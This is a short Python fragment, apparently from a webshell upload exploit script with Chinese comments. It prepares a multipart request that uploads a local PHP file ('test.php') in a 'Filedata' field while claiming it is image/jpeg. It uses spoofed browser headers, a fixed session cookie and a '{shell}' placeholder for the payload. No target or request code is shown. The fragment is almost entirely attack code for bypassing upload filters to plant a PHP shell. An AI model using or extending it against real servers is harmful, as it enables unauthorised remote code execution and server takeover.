uploadfilename="test.php" #文件上传名称
filename="test.php" #默认上传内容从当前目录的test.php读取
header={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Encoding":"gzip, deflate",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language":"zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6",
        "Cookie":"LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348",
        "Content-Type":"multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"}

data='''--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="{filename}"
Content-Type: image/jpeg

{shell}

--e64bdf16c554bbc109cecef6451c26a4--'''